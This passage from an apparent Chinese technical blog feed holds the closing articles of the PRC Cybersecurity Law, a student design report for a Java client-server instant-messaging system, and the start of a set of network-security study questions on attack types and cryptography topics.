发生网络安全事件，应当立即启动网络安全事件应急预案，对网络安全事件进行调查和评估，要求网络运营者采取技术措施和其他必要措施，消除安全隐患，防止危害扩大，并及时向社会发布与公众有关的警示信息</p><p><strong>第五十六条</strong> 省级以上人民政府有关部门在履行网络安全监督管理职责中，发现网络存在较大安全风险或者发生安全事件的，可以按照规定的权限和程序对该网络的运营者的法定代表人或者主要负责人进行约谈。网络运营者应当按照要求采取措施，进行整改，消除隐患。 </p><p><strong>第五十七条</strong> 因网络安全事件，发生突发事件或者生产安全事故的，应当依照《中华人民共和国突发事件应对法》、《中华人民共和国安全生产法》等有 关法律、行政法规的规定处置。 </p><p><strong>第五十八条</strong> 因维护国家安全和社会公共秩序，处置重大突发社会安全事件的需要，经国务院决定或者批准，可以在特定区域对网络通信采取限制等临时措施。 </p><h4 id="第六章-法律责任"><a href="#第六章-法律责任" class="headerlink" title="第六章 法律责任"></a>第六章 法律责任</h4><p><strong>第五十九条</strong> 网络运营者不履行本法第二十一条、第二十五条规定的网络安全保护义务的，由有关主管部门责令改正，给予警告；拒不改正或者导致危害网络安全等后果的，处一万元以上十万元以下罚款，对直接负责的主管人员处五千元以上五万元以下罚款。关键信息基础设施的运营者不履行本法第三十三条、第三十四条、第三十六条、第三十八条规定的网络安全保护义务的，由有关主管部门责令改正，给予警告；拒不改正或者导致危害网络安全等后果的，处十万元以上一百万元以下罚款，对直接负责的主管人员处一万元以上十万元以下罚款。 </p><p><strong>第六十条</strong> 违反本法第二十二条第一款、第二款和第四十八条第一款规定，有下列行为之一的，由有关主管部门责令改正，给予警告；拒不改正或者导致危 害网络安全等后果的，处五万元以上五十万元以下罚款，对直接负责的主管人员处一万元以上十万元以下罚款： </p><p>（一）设置恶意程序的； </p><p>（二）对其产品、服务存在的安全缺陷、漏洞等风险未立即采取补救措施，或者未按照规定及时告知用户并向有关主管部门报告的； </p><p>（三）擅自终止为其产品、服务提供安全维护的。 </p><p><strong>第六十一条</strong> 网络运营者违反本法第二十四条第一款规定，未要求用户提供真实身份信息，或者对不提供真实身份信息的用户提供相关服务的，由有关主管部门责令改正；拒不改正或者情节严重的，处五万元以上五十万元以下罚款，并可以由有关主管部门责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照，对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款。 </p><p><strong>第六十二条</strong> 违反本法第二十六条规定，开展网络安全认证、检测、风险 评估等活动，或者向社会发布系统漏洞、计算机病毒、网络攻击、网络侵入等网络安全信息的，由有关主管部门责令改正，给予警告；拒不改正或者情节严重的，处一万元以上十万元以下罚款，并可以由有关主管部门责令暂停相关业务、停业 整顿、关闭网站、吊销相关业务许可证或者吊销营业执照，对直接负责的主管人 员和其他直接责任人员处五千元以上五万元以下罚款。 </p><p><strong>第六十三条</strong> 违反本法第二十七条规定，从事危害网络安全的活动，或者 提供专门用于从事危害网络安全活动的程序、工具，或者为他人从事危害网络安全的活动提供技术支持、广告推广、支付结算等帮助，尚不构成犯罪的，由公安机关没收违法所得，处五日以下拘留，可以并处五万元以上五十万元以下罚款；情节较重的，处五日以上十五日以下拘留，可以并处十万元以上一百万元以下罚款。 单位有前款行为的，由公安机关没收违法所得，处十万元以上一百万元以下罚款，并对直接负责的主管人员和其他直接责任人员依照前款规定处罚。违反本法第二十七条规定，受到治安管理处罚的人员，五年内不得从事网络安全管理和网络运营关键岗位的工作；受到刑事处罚的人员，终身不得从事网络安全管理和网络运营关键岗位的工作。 </p><p><strong>第六十四条</strong> 网络运营者、网络产品或者服务的提供者违反本法第二十二条第三款、第四十一条至第四十三条规定，侵害个人信息依法得到保护的权利的，由有关主管部门责令改正，可以根据情节单处或者并处警告、没收违法所得、处违法所得一倍以上十倍以下罚款，没有违法所得的，处一百万元以下罚款，对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款；情节严重的，并可以责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照。违反本法第四十四条规定，窃取或者以其他非法方式获取、非法出售或者非 法向他人提供个人信息，尚不构成犯罪的，由公安机关没收违法所得，并处违法 所得一倍以上十倍以下罚款，没有违法所得的，处一百万元以下罚款。 </p><p><strong>第六十五条</strong> 关键信息基础设施的运营者违反本法第三十五条规定，使用未经安全审查或者安全审查未通过的网络产品或者服务的，由有关主管部门责令停止使用，处采购金额一倍以上十倍以下罚款；对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款。 </p><p><strong>第六十六条</strong> 关键信息基础设施的运营者违反本法第三十七条规定，在境外存储网络数据，或者向境外提供网络数据的，由有关主管部门责令改正，给予 警告，没收违法所得，处五万元以上五十万元以下罚款，并可以责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照；对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款。 </p><p><strong>第六十七条</strong> 违反本法第四十六条规定，设立用于实施违法犯罪活动的网站、通讯群组，或者利用网络发布涉及实施违法犯罪活动的信息，尚不构成犯罪的，由公安机关处五日以下拘留，可以并处一万元以上十万元以下罚款；情节较重的，处五日以上十五日以下拘留，可以并处五万元以上五十万元以下罚款。关闭用于实施违法犯罪活动的网站、通讯群组。单位有前款行为的，由公安机关处十万元以上五十万元以下罚款，并对直接负责的主管人员和其他直接责任人员依照前款规定处罚。 </p><p><strong>第六十八条</strong> 网络运营者违反本法第四十七条规定，对法律、行政法规禁止发布或者传输的信息未停止传输、采取消除等处置措施、保存有关记录的，由有关主管部门责令改正，给予警告，没收违法所得；拒不改正或者情节严重的， 处十万元以上五十万元以下罚款，并可以责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照，对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款。电子信息发送服务提供者、应用软件下载服务提供者，不履行本法第四十八条第二款规定的安全管理义务的，依照前款规定处罚。 </p><p><strong>第六十九条</strong> 网络运营者违反本法规定，有下列行为之一的，由有关主管部门责令改正；拒不改正或者情节严重的，处五万元以上五十万元以下罚款，对直接负责的主管人员和其他直接责任人员，处一万元以上十万元以下罚款</p><p>（一）不按照有关部门的要求对法律、行政法规禁止发布或者传输的信息，采取停止传输、消除等处置措施的； </p><p>（二）拒绝、阻碍有关部门依法实施的监督检查的； </p><p>（三）拒不向公安机关、国家安全机关提供技术支持和协助的。 </p><p><strong>第七十条</strong> 发布或者传输本法第十二条第二款和其他法律、行政法规禁止发布或者传输的信息的，依照有关法律、行政法规的规定处罚。 </p><p><strong>第七十一条</strong> 有本法规定的违法行为的，依照有关法律、行政法规的规定记入信用档案，并予以公示。 </p><p><strong>第七十二条</strong> 国家机关政务网络的运营者不履行本法规定的网络安全保护义务的，由其上级机关或者有关机关责令改正；对直接负责的主管人员和其他直接责任人员依法给予处分。 </p><p><strong>第七十三条</strong> 网信部门和有关部门违反本法第三十条规定，将在履行网络安全保护职责中获取的信息用于其他用途的，对直接负责的主管人员和其他直接责任人员依法给予处分。网信部门和有关部门的工作人员玩忽职守、滥用职权、徇私舞弊，尚不构成犯罪的，依法给予处分。 </p><p><strong>第七十四条</strong> 违反本法规定，给他人造成损害的，依法承担民事责任。违反本法规定，构成违反治安管理行为的，依法给予治安管理处罚；构成犯 罪的，依法追究刑事责任。 </p><p><strong>第七十五条</strong> 境外的机构、组织、个人从事攻击、侵入、干扰、破坏等危 害中华人民共和国的关键信息基础设施的活动，造成严重后果的，依法追究法律责任；国务院公安部门和有关部门并可以决定对该机构、组织、个人采取冻结财 产或者其他必要的制裁措施。 </p><h4 id="第七章-附-则"><a href="#第七章-附-则" class="headerlink" title="第七章 附 则"></a>第七章 附 则</h4><p><strong>第七十六条</strong> 本法下列用语的含义： </p><p>（一）网络，是指由计算机或者其他信息终端及相关设备组成的按照一定的规则和程序对信息进行收集、存储、传输、交换、处理的系统。 </p><p>（二）网络安全，是指通过采取必要措施，防范对网络的攻击、侵入、干扰、破坏和非法使用以及意外事故，使网络处于稳定可靠运行的状态，以及保障网络数据的完整性、保密性、可用性的能力。 </p><p>（三）网络运营者，是指网络的所有者、管理者和网络服务提供者。 </p><p>（四）网络数据，是指通过网络收集、存储、传输、处理和产生的各种电子数据。 </p><p>（五）个人信息，是指以电子或者其他方式记录的能够单独或者与其他信息结合识别自然人个人身份的各种信息，包括但不限于自然人的姓名、出生日期、 身份证件号码、个人生物识别信息、住址、电话号码等。 </p><p><strong>第七十七条</strong> 存储、处理涉及国家秘密信息的网络的运行安全保护，除应 当遵守本法外，还应当遵守保密法律、行政法规的规定。 </p><p><strong>第七十八条</strong> 军事网络的安全保护，由中央军事委员会另行规定。 </p><p><strong>第七十九条</strong> 本法自 2017 年 6 月 1 日起施行。</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 法律法规 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java项目 即时通讯系统</title>
      <link href="/2023/03/18/Java%E5%AE%9E%E8%AE%AD/"/>
      <url>/2023/03/18/Java%E5%AE%9E%E8%AE%AD/</url>
      
        <content type="html"><![CDATA[<h2 id="即时通讯系统"><a href="#即时通讯系统" class="headerlink" title="即时通讯系统"></a>即时通讯系统</h2><h3 id="1-系统概述"><a href="#1-系统概述" class="headerlink" title="1  系统概述"></a>1  系统概述</h3><blockquote><p><font color=blue>即时通讯是一款基于互联网的即时通讯软件，旨在为企业提供高效、安全、便捷的沟通工具。</font></p><p>本项目是一个基于Java语言开发的企业QQ系统，是基于C/S模型实现。系统可分为两个部分，服务端和客户端。服务端的工作主要是来监听和接收来自客户端的请求，然后存储并处理客户端发来的消息，并通知客户端。而客户端的功能是能够让新用户注册，通过用户名密码登陆并且使用该系统。通过服务端和客户端的协同工作最终使用户能够使用该程序，完成用户和用户之间的沟通。</p></blockquote><h4 id="1-1-功能概述"><a href="#1-1-功能概述" class="headerlink" title="1.1 功能概述"></a>1.1 功能概述</h4><ol><li><p>好友管理：支持用户进行好友添加、好友删除、修改等操作，同时也支持用户自行注册、登录、修改个人信息等操作</p></li><li><p>群组管理：支持用户创建、删除、修改群组，同时也支持用户加入、退出、查看群组等操作</p></li><li><p>即时通讯：支持用户之间的即时聊天，同时也支持群组内的多人聊天，聊天内容可以包括文字、图片、文件、表情等</p></li><li><p>安全性保障：所有数据传输均采用加密方式，保证用户信息和聊天内容的安全性</p></li><li><p>消息推送：支持消息推送功能，当有新消息到达时，系统会及时向用户发送通知，方便用户及时查看聊天记录</p></li><li><p>日志记录：系统会记录用户的聊天记录以及操作日志，方便管理员进行管理和监控</p></li></ol><h4 id="1-2-技术概述"><a href="#1-2-技术概述" class="headerlink" title="1.2 技术概述"></a>1.2 技术概述</h4><p><strong>1.2.1 Java基础知识：包括语法、面向对象编程</strong></p><p>Java具有简单性、面向对象、分布式、健壮性、安全性、平台独立与可移植性、多线程、多线程、动态性等特点。Java可以编写桌面应用程序、Web应用程序、分布式系统和嵌入式系统应用程序等</p><p><strong>1.2.2 网络编程技术Socket</strong></p><p>在本程序中为实现客户端和服务器之间的通信，使用Socket技术，socket能够通过java程序发出请求和处理网络发过来的请求。在建立双方网络连接的时候会使用到socket套接字。当网络成功建立连接后，双方都会有一个socket的实例被建立，通过使用和操作这个实例完成各种需求。对双方的连接来说，客户端和服务端并没有什·么差别socket是平等的，它们都是通过socket的实现类和它的子类来完成的</p><p>socket分为服务端和客户端两部分，服务端主要是可以监听一个特殊的端口，它能够监听并且捕获的向这个特定的端口发出的请求，这个请求就是由客户端来发起的。当连接建立之后会产生会话，完成会话之后关闭连接。而客户端主要是发起请求，它能够向某一个特定的服务器上的一个特殊的端口发起请求，然后建立连接处理会话，会话完成后和服务端一样关闭socket。客户端并不用像服务器一样规定一个特殊的打开的端口，系统会自动分配一个能够使用的端口</p><p><strong>1.2.3 数据库java.SQL与MySQL数据库</strong></p><p>Java.SQL是Java语言中用于访问关系型数据库的API，Java.SQL API提供了一组简单易用的接口和类来访问关系型数据库，使得开发者可以方便地进行数据库操作，Java.SQL API是面向对象的，它将数据库中的数据结构映射为Java中的对象，使得开发者可以使用面向对象的方式来操作数据库，Java.SQL API支持插件式的驱动程序架构，使得开发者可以通过添加新的驱动程序来支持更多的数据库类型</p><p>MySQL是一种开源的、关系型数据库管理系统（RDBMS），它是由瑞典MySQL AB公司开发的，现在属于Oracle公司旗下产品。MySQL广泛应用于Web应用程序的开发中，是目前使用最为广泛的关系型数据库之一。其具有高性能，可扩展性、简单易用、跨平台性、可靠性，被广泛应用于各种应用程序的开发中</p><p><strong>1.2.4 前端技术java.swing与java.awt</strong></p><p>Java Swing是一组用于创建图形用户界面（GUI）的Java类库。它提供了丰富的组件和工具，可以帮助开发人员构建跨平台的GUI应用程序。ava Swing提供了许多常用的GUI组件，例如按钮、文本框、下拉列表、表格等，还提供了一些高级组件，例如树形控件、分隔面板、标签页等。Java Swing提供了多种布局管理器，例如BorderLayout、FlowLayout、GridLayout等，可以帮助开发人员快速构建复杂的GUI界面</p><p><strong>1.2.5 系统及文件流操作java.io</strong></p><p>Java的核心库java.io提供了全面的IO接口。包括：文件读写、标准设备输出等。Java中IO是以流为基础进行输入输出的，所有数据被串行化写入输出流，或者从输入流读入。支持文件输入输出、网络输入输出、内存输入输出等多种方式，可以处理各种来源的数据</p><p><strong>1.2.6 各类型数据处理java.util</strong></p><p>Java.util是Java语言中一个重要的标准库，提供了许多常用的工具类和数据结构，用于处理各种数据类型、日期、时间、集合等问题。Java.util提供了众多的数据结构，如数组、列表、队列、栈、堆、哈希表、树、图等，可以满足不同场景下的数据存储和处理需求。此外提供了Date、Calendar、DateFormat、SimpleDateFormat等类，支持日期和时间的格式化、解析、计算和比较等操作</p><p><strong>1.2.7 java.long多线程设置</strong></p><p>java.lang包中的Thread类是Java实现多线程的核心类之一。通过创建Thread对象并调用其start()方法，可以启动一个新的线程并执行其中的代码</p><p>创建了一个新的线程后，会将其作为参数传递给Thread构造函数的Runnable对象中定义的代码块作为该线程的执行内容。调用start()方法后，该线程会在后台运行并执行其中的代码。除了Thread类，java.lang包中还提供了一些其他的类和接口，如Runnable接口、ThreadGroup类等，用于实现多线程编程。通过这些类和接口，可以方便地管理和控制多个线程的执行</p><h3 id="2-系统设计"><a href="#2-系统设计" class="headerlink" title="2  系统设计"></a>2  系统设计</h3><h4 id="2-1功能设计"><a href="#2-1功能设计" class="headerlink" title="2.1功能设计"></a>2.1功能设计</h4><p>系统功能框架如图2-1所示:</p><img src="./Java实训/系统功能框架.jpg" style="zoom: 67%;" /><center>图2-1系统功能框架</center>系统使用流程如图2-1所示：<img src="./Java实训/系统使用流程.jpg" alt="img" style="zoom:67%;" /><center>图2-2系统使用流程</center>即时通讯是一款基于互联网的即时通讯系统，系统分为两个部分服务端和客户端,实现基础的注册登录、好友管理、群组管理、即时通讯、日志记录、提供安全保障功能。<p>客户端为用户提供了注册登录功能，新用户通过注册账号进入即时通讯系统，系统自动展示好友列表窗体。用户根据需求通过用户账号、用户名的搜索实现好友添加，通过查看与设置好友信息实现对好友的备注、分类与管理；用户通过群号、群名的搜索想要加入的群聊，同时用户可以选取好友创建属于自己的群聊，根据需求修改群信息实现个性化群聊。</p><p>服务端实现了三大功能，界面显示功能、业务处理功能、数据传送功能。界面显示功能通过服务端的设置把控主窗体界面显示；业务处理功能管理对应的用户线程，顺利实现用户的注册、登录与退出，依托服务器连接数据库实现聊天业务的处理，完成信息的记录与查询；数据传送功能是即时聊天系统的核心功能，实现简单信息传输的同时，支持一定大小文件与图片的传输，同时为了增加交互的趣味性，支持表情包的传输，其余功能有待开发。</p><p><strong>2.1.1 登录界面</strong></p><ol><li><p>用户登录: 对输入用户名和密码进行验证。用户输入数据，发送到指定的客户端，由客户端与其相连的数据库进行比较</p></li><li><p>注册账号: 设置用户名、昵称、手机号、所在地、年龄、性别、密码并对信息进行存储</p></li></ol><p><strong>2.1.2 主界面</strong></p><ol><li><p>好友列表: 对好友分组实现创建、修改、删除；对好友实现修改备注、查看资料、清空聊天记录、置顶聊天等功能</p></li><li><p>群组列表: 对群组实现创建、解散、修改资料等功能</p></li><li><p>其他功能: 实现用户资料修改、查找/添加群和好友、查看群/好友申请列表/修改用户密码/退出登录等功能。</p></li></ol><p><strong>2.1.3聊天界面</strong></p><ul><li>实现消息发送、图片发送、表情发送、文件发送、截图、查看聊天记录、字体设置等功能。</li></ul><h4 id="2-2数据库设计"><a href="#2-2数据库设计" class="headerlink" title="2.2数据库设计"></a>2.2数据库设计</h4><p><strong>2.2.1 实体关系设计</strong></p><p>即时通讯系统采用的是MySQL数据库，然后借助数据库可视化软MySQL workbeach 创建数据库，通过相应建表语句，最后完整的设计出系统数据库。</p><p>系统数据库表基本E-R表关系如图2-2所示。</p><p>系统数据库实体属性如图2-3、图2-4、图2-5、图2-6所示。</p><img src="./Java实训/数据库基本E-R图.jpg" style="zoom:80%;" /><center>图2-2系统E-R图</center><img src="./Java实训/用户实体.jpg" style="zoom: 80%;" /><center>图2-3用户属性图</center><img src="./Java实训/好友属性E-R图.jpg" style="zoom:80%;" /><center>图2-4好友属性图</center><img src="./Java实训/消息属性E-R图.jpg" style="zoom:67%;" /><center>图2-5消息记录属性图</center><img src="./Java实训/群属性E-R图.jpg" style="zoom:80%;" /><center>图2-6群属性图</center>**2.2.2表**<p>以下列出数据库设计过程中相关表的情况。</p><ol><li>yonghu用户信息表 :该表主要用于存储注册用户的个人账号信息，主要由账号密码、性别、年龄、昵称、电话、地址、注册日期等字段组成，其表结构如表2-1所示。</li></ol><center>表2-1 yonghu表的结构</center>|   字段名   | 数据类型 | 长度 | 是否主键 |   描述   || :--------: | :------: | ---- | :------: | :------: || yonghuming | varchar  | 200  |    是    |  用户名  ||    mima    | varchar  | 200  |    否    |   密码   ||  xingbie   | varchar  | 200  |    否    |   性别   ||  nianling  | varchar  | 200  |    否    |   年龄   ||   aihao    | varchar  | 200  |    否    |   爱好   ||    role    | varchar  | 200  |    否    |   角色   ||  nicheng   | varchar  | 200  |    否    |   昵称   ||   phone    | varchar  | 200  |    否    |   电话   ||  address   | varchar  | 200  |    否    |   地址   ||  headimg   | varchar  | 200  |    否    |   头像   || registdate | varchar  | 200  |    否    | 注册日期 |<ol start="2"><li>haoyou好友表 :该表主要用于存储用户的好友信息并记录是否置顶，好友信息主要由好友名、好友备注、昵称、归属组ID组成，其表结构主要如表2-2所示。</li></ol><center>表2-2 haoyou表的结构</center>| 字段名           | 数据类型 | 长度 | 是否主键 | 描述       || :--------------- | :------: | :--: | :------: | :--------- || id               | varchar  | 200  |    是    | 好友ID     || haoyouyonghuming | varchar  | 200  |    否    | 好友用户名 || beizhuname       | varchar  | 200  |    否    | 备注名称   || nickname         | varchar  | 200  |    否    | 昵称       || zhiding          | varchar  | 200  |    否    | 是否置顶   || fenleiid         |   int    |  10  |    否    | 归属组ID   |<ol start="3"><li>qun 群组表 :该表主要记录创建的群的群号、群名、群主、群备注以及群头像，其表结构主要如表2-3所示</li></ol><center>表2-3 qun表的结构</center>| 字段名  | 数据类型 | 长度 | 是否主键 |  描述  || :-----: | :------: | :--: | :------: | :----: || qunhao  | varchar  | 200  |    是    |  群号  || qunming | varchar  | 200  |    否    |  群名  || qunzhu  | varchar  | 200  |    否    |  群主  ||  note   | varchar  | 200  |    否    |  备注  || headimg | varchar  | 200  |    否    | 群头像 |<ol start="4"><li>qunyonghu 群用户表 :该表主要记录群用户ID、用户名，以及归属群的群号，其表结构主要如表2-4所示。</li></ol><center>表2-4 qunyonghu表的结构</center>| 字段名     | 数据类型 | 长度 | 是否主键 | 描述     || ---------- | -------- | ---- | -------- | -------- || id         | varchar  | 200  | 是       | 群用户ID || qunhao     | varchar  | 200  | 否       | 归属群号 || yonghuming | varchar  | 200  | 否       | 用户名   |<ol start="5"><li>xiaoxijilu 消息记录表 :该表主要是消息记录流，记录消息的发送方、接收方、类型、内容、大小，其表结构主要如表2-5所示</li></ol><center>表2-5 xiaoxijilu表的结构</center>| 字段名        | 数据类型 | 长度 | 是否主键 | 描述     || ------------- | -------- | ---- | -------- | -------- || id            | varchar  | 200  | 是       | 编号     || fasongren     | varchar  | 200  | 否       | 发送方   || jieshouren    | varchar  | 200  | 否       | 接收方   || neirong       | varchar  | 200  | 否       | 消息内容 || leixing       | varchar  | 200  | 否       | 消息类型 || fasongshijian | varchar  | 200  | 否       | 发送时间 || size          | varchar  | 200  | 否       | 消息大小 |<ol start="6"><li>fenlei :该表主要记录用户的所属分组，主要包括用户名、归属分组名、归属分组的ID，其表结构主要如表2-6所示</li></ol><center>表2-6 fenlei表的结构</center>| 字段名    | 数据类型 | 长度 | 是否主键 |   描述   || --------- | :------: | :--: | :------: | :------: || id        |   int    |  10  |    是    |    ID    || parentid  |   int    |  10  |    否    | 归属组ID || mingcheng | varchar  | 200  |    否    |   组名   || username  | varchar  | 200  |    否    |  用户名  |<ol start="7"><li>qiandao :该表用于记录用户的上线日期，其表结构主要如表2-7所示</li></ol><center>表2-7 qiandao表的结构</center>|   字段名    | 数据类型 | 长度 | 是否主键 |   描述   || :---------: | :------: | :--: | :------: | :------: ||     id      | varchar  | 200  |    是    |    ID    || qiandaoren  | varchar  | 200  |    否    |  用户名  || qiandaoriqi | varchar  | 200  |    否    | 上线日期 |<h3 id="3-系统实现"><a href="#3-系统实现" class="headerlink" title="3  系统实现"></a>3  系统实现</h3><h4 id="3-1登录界面"><a href="#3-1登录界面" class="headerlink" title="3.1登录界面"></a>3.1登录界面</h4><p><strong>3.1.1用户登录</strong></p><p>用户登录界面如图3-1所示。</p><img src="./Java实训/用户登录界面.png"  /><center>图3-1用户登录界面图</center>页面由swing代码设计完成，通过swing的addMouseListener鼠标点击触发器，检测各功能的使用，当用户按下登录初始化一个消息对象，Message msg=new Message(textField.getText());并指定消息对象的类型为connect，并将消息发送给客户端，并开启线程监听服务器端发送信息。<p>在服务器端有Server.Task用于处理客户端发送的各种消息，当检查到消息类型为connect，进入登录审查，检查数据库签到表，如果表项不为空，说明当前账户已经在其他设备登录，返回该用户已登录信息，防之存储用户名对应的ip 端口，并查询数据库用户表项用户是否存在和密码是否正确。</p><p>如果账户密码匹配成功则返回信息，登录成功，反之返回登录失败，客户端会通过线程监听服务器返回的信息作出相应的反馈。</p><p><strong>3.1.2注册账号</strong></p><p>注册账号界面如图3-2所示。</p><img src="./Java实训/账号注册页面.png" style="zoom:67%;" /><center>图3-2注册账号界面图</center>与登录流程类似，当用户点击注册按钮，会初始化一个消息对象，消息对象的类型字段为regist，并通过java.sql将数据存储到用户表上，此外与登录页面类似<p>另外的，在上传头像上使用java.io库中的getSelectedFile函数，在本地计算机中选取图像与头像，头像的传输与其在数据库的存储则是这一项目中较为困难的点，我们在用户表中设有headimg用于经过计算得到的存储32位的头像散列，并将其一流的形式发到对应服务器的headimg中，在用户登录时也是对应将这里的数据流发送给客户端</p><h4 id="3-2主界面"><a href="#3-2主界面" class="headerlink" title="3.2主界面"></a>3.2主界面</h4><p>即时通讯系统主界面如图3-3所示。</p><img src="./Java实训/即时通讯系统主界面.png"  /><center>图3-3主界面</center>**3.2.1好友列表**<p>分组创建功能实现如图3-4所示，修改好友备注功能实现如图3-5所示。</p><img src="./Java实训/创建图片.png" style="zoom:80%;" /><center>图3-4分组创建</center><img src="./Java实训/修改备注.png"  /><center>图3-5修改备注</center>**3.2.2群组列表**<p>创建群功能实现如图3-6所示。</p><img src="./Java实训/群聊功能实现.jpg"  /><center>图3-6群创建</center>**3.2.3其他功能**<p>添加好友功能实现如图3-7所示，添加群聊功能实现如图3-8所示，好友申请列表如图3-9所示</p><img src="./Java实训/添加好友功能实现.png" style="zoom:80%;" /><center>图3-7添加好友</center><img src="./Java实训/入群申请.png" style="zoom:80%;" /><center>图3-8申请入群</center><img src="./Java实训/好友申请列表.png"  /><center>图3-9好友申请列表</center>#### 3.3聊天界面<p>私聊聊天界面如图3-10所示，群聊聊天界面如图3-11所示</p><img src="./Java实训/私聊界面.png" style="zoom:80%;" /><center>图3-10 私聊聊天界面</center>本项目作为一个模仿QQ设计的即时通讯软件，私聊与群聊毫无疑问是程序的核心，在聊天的功能基础上我们受课程原始项目启发，实现了原有项目未能实现的字体设计，图片发送与文件发送，及表情包。表情包的本质实际为预先存储于程序文件夹下的图片与图片传输没有本质区别，在两个客户端均省去了，使用java.io库中程序寻找文件和，发送文件流的过程。<p>截图功能作为老师所提供项目本就实现的功能，在原有基础上没有做太大改动。文件传输与图片传输与用户注册或修改用户信息时头像的传输方式类似，都是同msg流实现文件在网络中传输，发送的数据会记录到数据库中，而接受放客户端在接受到想用信息后会将msg流存储与/msg文件夹下，实现了信息的本地存储。</p><h4 id="3-4数据存储实现"><a href="#3-4数据存储实现" class="headerlink" title="3.4数据存储实现"></a>3.4数据存储实现</h4><p>数据存储结果如图3-12</p><img src="./Java实训/数据存储结果.jpg" style="zoom:80%;" /><center>图3-12 数据存储结果</center>**在数据库的实现过程中具体操作如下：**<ol><li><p>获取数据库连接：使用getConnection方法加载MySQL数据库驱动程序”jdbc:mysql://“+ip+”:3306/“+ dbname +”?characterEncoding=utf-8”, username, password,并通过getConnection()方法建立数据库连接</p></li><li><p>在代码中实现创建数据库和数据表，比如createStatement().execute()方法执行创建数据库命令及getConn() .createStatement().executeUpdate()方法实现数据表创建</p></li><li><p>对建立的数据库连接进行测试Connection对象的createStatement()方法创建Statement对象，使用Statement对象执行SQL语句，通过executeQuery()方法执行查询语句</p></li><li><p>创建对象，使用userService.save()实现将各种所需数据数据记录进数据表中</p></li></ol><h3 id="4-结论"><a href="#4-结论" class="headerlink" title="4  结论"></a>4  结论</h3><p>本项目是一个基于Java的企业QQ系统，实现了用户注册、登录、添加好友、聊天等基本功能。能够完成用户日常交流的需要。</p><p>通过本项目的实践，我们深入理解了Java语言和相关技术的应用，掌握了Swing、Java SQL、Java.util、MySQL、多线程等技术的使用，提高了自己的编码能力和项目开发经验。同时，本项目也为企业内部沟通和协作提供了一种新的方式，具有一定的实际应用价值。</p><h3 id="5-源代码"><a href="#5-源代码" class="headerlink" title="5 源代码"></a>5 源代码</h3><p>怎么说呢，在实训过程中找代码学习是非常麻烦的，这里我就直接放部分找到的材料源代码的百度网盘吧……</p><blockquote><p><font color=orange>链接：<a href="https://pan.baidu.com/s/1mk02u-x_Cp-ULR5G-zkLCA?pwd=pv7m">https://pan.baidu.com/s/1mk02u-x_Cp-ULR5G-zkLCA?pwd=pv7m</a> </font ><br><font color=orange>提取码：pv7m </font></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 项目设计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络安全思考题</title>
      <link href="/2023/03/03/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%80%9D%E8%80%83%E9%A2%98/"/>
      <url>/2023/03/03/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%80%9D%E8%80%83%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h2 id="计算机网络安全思考题："><a href="#计算机网络安全思考题：" class="headerlink" title="计算机网络安全思考题："></a>计算机网络安全思考题：</h2><h3 id="第一章概述"><a href="#第一章概述" class="headerlink" title="第一章概述"></a>第一章概述</h3><h4 id="思考题："><a href="#思考题：" class="headerlink" title="思考题："></a>思考题：</h4><ul><li><p><strong>计算机网络安全的概念是什么？网络安全有哪几个特征？各特征的含义是什么？</strong></p><ul><li>网络安全指网络系统的软件硬件、以及系统存储和传输中的数据收到保护，不因偶然的或恶意的原因而遭到破坏、更改、泄露，网络系统连续可靠正常的运行，网络服务不中断。</li><li>网络安全的特征及含义：<ul><li>机密性： 指保证信息与信息系统不被非授权的用户实体或过程所获取与使用</li><li>完整性： 指信息在生成、传输、存储和使用过程中不应被第三方篡改</li><li>可用性 ：指信息与信息系统可被授权实体正常访问的特性，即授权实体在需要时能够存取所需信息</li><li>可控性 ：对信息的存取和传播具有完全的控制能力，可以控制信息的流向和行为方式</li><li>真实性 ： 包括信息的完整性，准确性和发送人的身份真实性等方面</li></ul></li></ul></li><li><p><strong><font color=red>列出并简述主动攻击与被动攻击的分类</font></strong> </p><p><font color=orange>被动攻击:    试图获取和使用系统中的信息 ，但是不会对系统的资源产生破坏，包括消息内容泄露和流量分析</font></p><p><font color=orange>主动攻击： 试图改变系统的资源或者伪装成系统中的合法用户进行操作， 包括假冒，重传，篡改和拒绝服务</font></p></li><li><p><strong>网络安全体系包括哪几个部分？各部分又由哪几个方面组成？</strong></p><ul><li>网络安全体系由网络安全技术体系、网络安全组织体系、网络安全管理体系三部分组成</li><li>网络安全技术体系包括：物理安全、计算机系统平台安全、通信安全、应用系统安全</li><li>网络安全组织体系： 网络安全组织体系是多个网络安全组织按照一定的关系汇集形成的一套组织系统<ul><li>我国的网络安全组织体系，一是国家信息安全管理、协调或服务组织系统，二是各政府机构内设的专门承担信息安全管理或服务工作的实体或虚体机构。</li></ul></li><li>网络安全管理体系由法律管理，制度管理和培训管路3个部分组成</li></ul></li></ul><h3 id="第二章-密码学"><a href="#第二章-密码学" class="headerlink" title="第二章 密码学"></a>第二章 密码学</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 古典密码学维吉尼亚密码与希尔密码</span><span class="token comment"># 如何利用公钥密码技术实现即加密又认证</span><span class="token comment"># 如何利用公钥密码技术实现混合加密</span><span class="token comment"># 本章重点：Diffe-Hellman 秘钥交换协议 D-h的中间人攻击（简答）</span><span class="token comment"># Diffe-Hellman安全性分析</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 